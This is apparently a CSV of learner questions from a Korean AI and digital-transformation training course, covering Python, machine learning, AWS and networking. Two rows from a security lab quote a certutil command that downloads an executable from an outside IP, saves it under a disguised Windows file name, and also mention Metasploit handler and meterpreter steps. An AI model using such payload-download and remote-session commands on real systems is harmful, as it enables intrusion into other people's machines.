트랙,지역,문의내용,문의유형
DX컨설턴트,수도권,"1-(양성 클래스 비율의 제곱+음성 클래스 비율의 제곱)을 통해 지니 불순도를 계산해 각 변수의 지니 불순도를 구한다는 것은 이해하였습니다.
그럼 이때 지니 평균의 가중평균을 구하는 이유는 변수별 지니 불순도의 가중평균을 구하여 feature_imporatnce를 계산하기 위함이라고 이해하면 될까요?",이론
DX컨설턴트,충남/충북,"안녕하세요.
코딩 마스터스 문제 풀이 중 답이 나오지 않아 문의드립니다.

저는 단순히 제곱근을 구해주는 프로그램을 만드는 것이라고 해석하였습니다.
그런데 저의 해석이 잘못된 것인지 여러 방법으로 코드를 짜도 Fail만 떠서 문의 드립니다.

제가 사용한 방법은
import math 를 해서 math.sqrt 함수,
그리고 n ** (1/2)와 n **(0.5) 이렇게 세가지 방법을 통해서
if구문도 활용해 보고  input, print만 사용도 해 보았지만 모든 case에서 Fail이 나와 어려움을 겪고 있습니다.

제가 문제의 해석을 잘못한 걸까요? 아니면 전제조건을 이해하지 못한걸까요?

첨부 이미지는 제가 마지막으로 짠 코드입니다.(역시 모든 케이스에서 Fail입니다..)",코드1
DX컨설턴트,전남/전북,"[실습3]
what, where, how 에서 기본 질문이 겹칠 수도 있나요?? ",이론
,,"2. 원핫 인코더 
get_dummis 대신 원핫인코더를 사용하여
'object' 범주 (문자형) 의 컬럼을 모두 원핫 인코딩으로 변환 하고자 합니다. 
라벨 인코더와 같은 코드 형식으로 입력했을 때 첨부파일과 같은 오류가 납니다 (ㅠㅠ)
원핫 인코딩을 쓰는 파이썬 문법과
원핫 인코딩 후 원래 데이터 프레임 형식에 넣는(붙이는) 방법이 있을까요~?

구글에 검색해 보았을 때는 데이터 프레임 내 
특정 컬럼 원핫인코딩 변환 후 array 로 print 되는 것만 보여주고 이후에 
원래 데이터 프레임에 적용되는(붙이는) 작업은 보여주지 않아 질문 드려봅니닷..

감사합니다! ",코드2
AI개발자,수도권,실습을 여태 못해서 강의만 듣고 있었는데 지장이 없을까요..?,시스템 운영
AI개발자,대구/경북,"모델링을 하려고 x_train, x_val, y_train, y_val을 지정하고 싶은데,
train_generator, validation_generator에서 어떻게 x,y를 사용할 수 있나요?",코드2
DX컨설턴트,대구/경북,"만들 수 있는 사각형 전체에서 0이 포함되는 사각형을 제거하는 로직을 생각했습니다. 아래 코드는 전체 사각형 개수를 구하는 것인데, 0이 포함되는 사각형 개수는 어떻게 구해야할지 떠오르지 않아서 질문드립니다. 아니면 다른 효율적인 방법이 있을까요?


n, m = map(int, input().split())
w=0
h=0
a=[]

for i in range(n):
    a.append(map(int,input().split()))

for i in range(n):
    w += n - i 
for i in range(m): 
    h += m - i
whole=w*h",코드1
AI개발자,수도권, MYSQL HOST USER PASSWORD DB 정보 오가 있습니다 라고 뜨는데 어떻게 하나요?,웹
,,"2) 교안 63페이지의 각 노드의 의미부분은 
히든레이어에 연결된 데이터가 다른 것이 차이점이다라고 이해하는 게 맞는 건가요?",이론
DX컨설턴트,수도권,솔루션을 장르가 하나가 아닌 두개로 엮어도 될까요??,이론
AI개발자,전남/전북,"/content/OIDv4_ToolKit 안의 classes.txt 파일을 Helmelt과 Person으로 수정해준 뒤에 어떤 절차를 밟아야 label이 클래스명이 아닌 클래스 넘버로 바뀌는건가요?
 classes.txt 를 수정했는데도 label이 바뀌지 않아서요ㅠㅠ",코드2
AI개발자,부산/경남,"seqeuntial과 functional 딥러닝 방식 차이를
저는 단순하게 모델의 생성 방법의 차이와 input과 output layer를 엮어주는 차이라고만 이해를 했는데 틀렸다면 좀 더 명확하게 설명해주실 수 있을까요",이론
DX컨설턴트,수도권,"동기식 처리와 비동기식 처리에 대해서 비교하며 배울 때(여행준비나 카페를 예로) 직관적으로 보면 비동기식처리가 더 우수하고 효율적으로 보입니다.
비용적인 측면은 고려하지 않는다고 했을 때, 동기식 처리가 더 유리하고 동기식 처리를 주로 사용하는 경우는 어떤 경우가 있나요?",이론
AI개발자,수도권,이번에 처음으로 tensorflow 말고 pytorch를 배우는데 혹시 차이점을 알려주실 수 있을까요?,이론
DX컨설턴트,수도권,"46p 부터 잘 안된거 같기도 하고
cloud9 에서 안돌아가네요...
아마존 계정접속해서 도와주실수 있을까요?",웹
AI개발자,부산/경남,"오류 전문입니다.

InvalidArgumentError                      Traceback (most recent call last)
 in 
----&gt; 1 history = model.fit(x_train, y_train, epochs=30, batch_size=64, validation_split=0.3, callbacks=[es, mc])

/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/engine/training.py in fit(self, x, y, batch_size, epochs, verbose, callbacks, validation_split, validation_data, shuffle, class_weight, sample_weight, initial_epoch, steps_per_epoch, validation_steps, validation_batch_size, validation_freq, max_queue_size, workers, use_multiprocessing)
   1098                 _r=1):
   1099               callbacks.on_train_batch_begin(step)
-&gt; 1100               tmp_logs = self.train_function(iterator)
   1101               if data_handler.should_sync:
   1102                 context.async_wait()

/usr/local/lib/python3.6/dist-packages/tensorflow/python/eager/def_function.py in __call__(self, *args, **kwds)
    826     tracing_count = self.experimental_get_tracing_count()
    827     with trace.Trace(self._name) as tm:
--&gt; 828       result = self._call(*args, **kwds)
    829       compiler = ""xla"" if self._experimental_compile else ""nonXla""
    830       new_tracing_count = self.experimental_get_tracing_count()

/usr/local/lib/python3.6/dist-packages/tensorflow/python/eager/def_function.py in _call(self, *args, **kwds)
    886         # Lifting succeeded, so variables are initialized and we can run the
    887         # stateless function.
--&gt; 888         return self._stateless_fn(*args, **kwds)
    889     else:
    890       _, _, _, filtered_flat_args = \

/usr/local/lib/python3.6/dist-packages/tensorflow/python/eager/function.py in __call__(self, *args, **kwargs)
   2941        filtered_flat_args) = self._maybe_define_function(args, kwargs)
   2942     return graph_function._call_flat(
-&gt; 2943         filtered_flat_args, captured_inputs=graph_function.captured_inputs)  # pylint: disable=protected-access
   2944 
   2945   @property

/usr/local/lib/python3.6/dist-packages/tensorflow/python/eager/function.py in _call_flat(self, args, captured_inputs, cancellation_manager)
   1917       # No tape is watching; skip to running the function.
   1918       return self._build_call_outputs(self._inference_function.call(
-&gt; 1919           ctx, args, cancellation_manager=cancellation_manager))
   1920     forward_backward = self._select_forward_and_backward_functions(
   1921         args,

/usr/local/lib/python3.6/dist-packages/tensorflow/python/eager/function.py in call(self, ctx, args, cancellation_manager)
    558               inputs=args,
    559               attrs=attrs,
--&gt; 560               ctx=ctx)
    561         else:
    562           outputs = execute.execute_with_cancellation(

/usr/local/lib/python3.6/dist-packages/tensorflow/python/eager/execute.py in quick_execute(op_name, num_outputs, inputs, attrs, ctx, name)
     58     ctx.ensure_initialized()
     59     tensors = pywrap_tfe.TFE_Py_Execute(ctx._handle, device_name, op_name,
---&gt; 60                                         inputs, attrs, num_outputs)
     61   except core._NotOkStatusException as e:
     62     if name is not None:

InvalidArgumentError:  indices[0,16] = 1 is not in [0, 1)
	 [[node sequential/embedding/embedding_lookup (defined at :1) ]] [Op:__inference_train_function_1887]

Errors may have originated from an input operation.
Input Source operations connected to node sequential/embedding/embedding_lookup:
 sequential/embedding/embedding_lookup/1562 (defined at /usr/lib/python3.6/contextlib.py:81)

Function call stack:
train_function",코드2
DX컨설턴트,부산/경남,"어제 휴가 사용해서 지금 실습 따라가려 하는데

실습 자료에서 ""배정된 user번호""를 찾지 못하겠습니다

이름 태그를 userXX-VPC 형태로 입력하라하는 것 같은데

XX에 아무 번호 입력해도 될까요?",웹
DX컨설턴트,수도권,"# tip 크기로 5등분해서 등급(a ~ e) 구하기
tip['tip_grp'] = pd.cut(  tip['tip'] , 5  ,  labels = list('EDCBA'))

여기서 pd가 pandas를 의미하는건 알겠는데, pandas가 어떤 것을 의미하는지 알 수 있을까요??",코드2
DX컨설턴트,수도권,"4번 데이터분석에서 (5), (6)번에서의 시각화는 막대 그래프를 그리라는건가요? 아니면 선 그래프인가요?",코드2
DX컨설턴트,수도권,"오늘 2-2까지만 가능하고 2-3에서 오류가 발생해서 원격지원을 요청했지만 시간상 지원 받지 못했습니다.

뒷 부분을 해보지 못했는데 어떻게 하나요..?

2-3에서 
윈도우 10에서 WindowSearch.exe 쓰고 엔터 누르면 c:\users\public으로 나오는데 맞나요?

2-2에서 
리눅스에서 핸들러할 때 마지막에 exploit -j -z라고 되어있지만 이미지에는 -i -z라고 되어있습니다. 
어떤게 맞나요?

2-3에서 
리눅스에서 sessios -i 1까지 치고
[*] Starting interaction with 1 ...까지 뜨고서
metetpreter &gt; shell을 입력했지만 아무 응답이 없었습니다.
그럼 msf5 exploit(multi/handler) &gt; 로 돌아가는 명령어는 없나요??

",웹
DX컨설턴트,충남/충북,원격지원준비중이라고 하단에 뜹니다,원격
DX컨설턴트,충남/충북,"윈도우 프롬프트에서 작업중 cd Downloads 이후 퍼블릭 DNS를 연결하면 ec2-user@ec2-52-199-70-137.ap-northeast-1.compute.amazonaws.com: Permission denied (publickey,gssapi-keyex,gssapi-with-mic). 이런 결과가 도출됩니다 ",웹
DX컨설턴트,부산/경남,"교재에서 certutil -urlcache -f http://31.44.7.100/test.exe c:\users\public\WindowSearch.exe 입력후 이렇게 나와야 할 부분에 :
CertUtil: URLCache command completed successfully.

저는 이렇게 나옵니다 :
CertUtil: -URLCache command FAILED: 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
CertUtil: The operation timed out

행여나 문제 없을까하고 그대로 진행해봐도 \Users\Public에 dir 확인해보면
WindowsSearch.exe.가 없더라구요

도와주세요!

",웹
DX컨설턴트,수도권,"재질문드립니다 ㅎㅎ
객체나 클래스의 개념에 대해 설명부탁드립니다^^",이론
DX컨설턴트,수도권,"아까 사진 첨부를 안 해서 여쭙니다...!

질문1. 
이게 정확히 뭔지를 모르겠습니다..!
왜 이 숫자들이 255, 65536, 16777216 이렇게 늘어나는 건지가 헷갈립니다.
65536은 256의 제곱이고 16777216은 65536의 제곱인데
왜 255는 1이 제외되는지가 너무 헷갈립니다..!

질문 2. 여기서도 128*2 하면 256 아닌가요...?
왜 255로 나오는 건지가 너무 헷갈립니다ㅠ",이론
AI개발자,대구/경북,pem 파일 업로드한 뒤 cloud9에서 인스턴스로 넘어가는 부분을 놓쳤습니다..! 어딜 누르면 넘어가지나요?,웹
AI개발자,수도권,"이번 실습 코드에서 모델을 생성한 후, 테스트 이미지로 만든 Generator 를 predict로 넣으면 모든 데이터가 하나의 클래스(sam)로만 예측됩니다 ㅠㅠ. 같은 현상을 보이는 다른 분들도 조금 있던데, 혹시 추가적으로 고려해야 할 사항을 알 수 있을까요?",코드2
AI개발자,전남/전북,"# 실습해보세요.
train_datagen = ImageDataGenerator(rescale=1./255,
                                   shear_range=0.2,
                                   zoom_range=0.2,
                                   horizontal_flip=True
)

# train_genrator 생성
train_generator = train_datagen.flow_from_directory(
    TRAIN_PATH,
    subset='training',
    target_size=(150,150),
    batch_size=32,
    class_mode ='binary'
)

# validation_generator 생성
validation_generator = train_datagen.flow_from_directory(
    TRAIN_PATH,
    subset='validation',
    target_size=(150,150),
    batch_size=32,
    class_mode='binary'
)

전처리 코드는 이렇게 작성했는데 train 폴더만들고 x_train, y_train 이런것은 어떻게 만들어야 하나요?",코드2
DX컨설턴트,부산/경남,"[실습 3] 피드백 요청드립니다.

실습을 진행하면서 전략 요소에 대해서 정확한 이해가 부족했던 것 같습니다. 또한, 전체적인 질문에 대한 정보원 파악 과정에서 모호하다는 느낌을 받았습니다. 

감사합니다.",이론
DX컨설턴트,부산/경남,"Router&gt;en[Tab]
이 부분에서 철자그대로 치고 엔터를 치는게 아니라 
en을 쓰고 tab키를 눌렀어야 하는 건가요?

저 상황에서 다시 돌아가는 방법은 뭔가요 
창을 끄고 처음부터 다시 명령어를 쳐야 하나요?",웹
DX컨설턴트,수도권,"표집분포는 중심극한 정리에 따라 정규분포를 따르고,
하나하나의 표본의 평균은 정규분포를 따른다고 이해하면 될까요?
",이론
AI개발자,대구/경북,"pretrainded model의 가중치를 사용한다는 
가중치가 정확히 어떤것인가요? backbone 구조 전체를 의미하나요? 
아니면 구조에서 계산되는 w를 사용한다는건가요?",이론
DX컨설턴트,수도권,"안녕하세요!
강사님께서 이전에 교안 새로 다운 받아달라고 말씀해주셨는데, 강의실- 학습자료에 있는 39번 자료 다운 받으면 되는 건 지 문의드리고 싶습니다.

변경된 새 교안 파일을 다운 받은 것이 맞는 지 확실하지 않아 문의드리게 되었습니다!",시스템 운영
AI개발자,수도권,'함수안에 msg가 모두 주석처리되어 호이스팅되지 않는다 그래서 global에 있는 msg를 가져올 수 있다'고 이해해도 될까요?,웹
DX컨설턴트,부산/경남,"튜터님 앞전의 피드백 감사드립니다

제작 중 경험과 실질적으로 느꼈던 문제를 통해 개선이 필요하다 느꼈던 방향으로 적었지만, 실질적으로 어디에서 정보를 얻을수 있을지에 대해 어려운 점이 있습니다. 사이트 관련으로 지혜가 있다면 공유받고 싶습니다 

홈페이지나 뉴스를 통해 정보를 얻는다고 적어도 될까요? 

방향을 잘못잡은 부분있으면 어디 부분을 수정하면 좋을지도 요청드리고 싶습니다",이론
AI개발자,수도권,"안녕하세요, 
apply 함수를 적용시켰는데 AttributeError 에러가 뜹니다..
코드 한 번 봐주실 수 있으실까요? ㅠㅠ 
그 위에까지는 정상적으로 실행이 됩니다!",웹
DX컨설턴트,부산/경남,"왜 inner가 저 값이 나오는지 궁금합니다 
그리고 오른쪽 왼쪽이 어떤 기준으로 만들어지는지도 궁금합니다 ",코드2
DX컨설턴트,수도권,"결측치 제거 기준을 다음과 같이 이해하면 되는 것인지 궁금합니다
행 제거: 삭제할 데이터 양이 적고,  운영시스템에서 다시 NA가 발생되지 않을 때 제거 가능
                               
열 제거: 결측치가 많거나, 변수가 중요하지 않을 때 제거 가능",이론
AI개발자,대구/경북,"강사님께서 사용자의 의도를 담아서 하이퍼파라미터 튜닝하는 것의 중요성을 강조하셨는데,
머신러닝 수업때는 사용자의 의도를 최대한 배제하고 기계가 스스로 학습하도록 해야한다고 배웠습니다.
딥러닝에서 하이퍼파라미터 튜닝의 비중이 더 커져서 다른건가요?",이론
AI개발자,수도권,"코마 문제를 푸는데 테스트 셋에서 하나만 계속 FAIL이 뜨는 데 왜 그런거죠...
N = int(input())
a_i = list(map(int, input().split()))
cnt = 0
while len(set(a_i)) != 1:
    if max(a_i)-min(a_i) &gt; 1:
        cnt += 1
        a_i[a_i.index(max(a_i))] -= 1
        a_i[a_i.index(min(a_i))] += 1
    else:
        cnt += 1
        a_i[a_i.index(max(a_i))] -= 1
        
print(cnt)
이 코드인데 쥬피터 노트북으로 계속 돌려봐도 모르겠습니다...
힌트라도 알 수 있을까요...ㅠㅠ",코드1
DX컨설턴트,부산/경남,"데이터 변수를 bike로 저장했습니다
var = 'hour'
bike = df[var]
bike.head
로 했는데 df는 뭘로 바꿔야하나요",코드2
,,"5. 이번 과제의 경우 t-test분석의 의미가 없는지 궁금합니다. 종속변수가 2개 값을 갖으니 t-test를 진행하면 각 범주에 대한 변수가 값는 통계적 유의성을 볼 수 있다고 생각했었는데, 이럴 경우 t-test가 아닌 로지스틱 회귀 분석을 통해서 변수 판단하는 것이 맞는지 문의드립니다.

사실 데이터 전처리 과정에서 로지스틱 회귀 분석 제외 여러 처리를 통한 변수 제거를 했었는데 오히려 결과값이 많이 떨어져서 제가 데이터 전처리 방향에 있어서 잘못 이해하는게 아닌가 싶어서 질문 드립니다.ㅠㅠㅠ",이론
AI개발자,대구/경북,"def waterPay(x,y) : 
    if x == 'A' : 
        sumA = y*100
        return sumA
    
    if x == 'B' : 
        if y  50 : 
            sumB = 50*150 + (y-50)*75
        
    return sumB

x = str(input('수도회사를 입력하세요.:'))
y = int(input('수도사용량을 입력하세요.:'))

print(f'수도회사""{x}""의 수도사용량은 ""{waterPay(x,y)}원"" 입니다.')",코드1
DX컨설턴트,대구/경북,"k = int(input())

n = 0
while True:
    if (n &gt; k) & (n % 2 == 0) & ((n / 2) % 2 == 1):
        print(n)
        break
    else:
        n += 1
        continue

시간초과가 뜨는데 
while문 이외에 방법으로 풀어야 되나요? 
아니면 while문 식이 잘못되었나요?",코드1
